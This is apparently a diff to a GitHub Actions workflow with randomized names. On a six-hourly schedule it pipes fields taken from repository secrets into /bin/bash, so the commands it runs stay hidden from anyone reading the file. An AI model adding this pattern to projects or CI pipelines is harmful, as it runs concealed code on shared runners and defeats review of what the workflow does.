@@ -1,27 +1,20 @@
 name: jiatingqian7584
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
+    - cron: '41 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiatingqian7584
         env:
-          yuwz4: ${{ secrets.yuwz4 }}
+          roswl8: ${{ secrets.roswl8 }}
         run: |
-          echo $yuwz4 | jq -r .nbov9 | /bin/bash
-          echo $mjscz414 | jq -r .j1 | /bin/bash
-          echo $ocr07 | jq -r .irf11 | /bin/bash
-          echo $fuldm386 | jq -r .fhbb1 | /bin/bash
-          echo $qx81 | jq -r .tcxuk53 | /bin/bash
-          echo $b22 | jq -r .bca6515 | /bin/bash
-          echo $lum4 | jq -r .gan753 | /bin/bash
-          echo $bw2 | jq -r .cc3 | /bin/bash
-          echo $oekw947 | jq -r .et7725 | /bin/bash
+          echo $roswl8 | jq -r .lv19739 | /bin/bash
+          echo $irdlq444 | jq -r .uaivr60 | /bin/bash
+          echo $pi8500 | jq -r .haf8873 | /bin/bash
+          echo $xuj12687 | jq -r .q42051 | /bin/bash
 
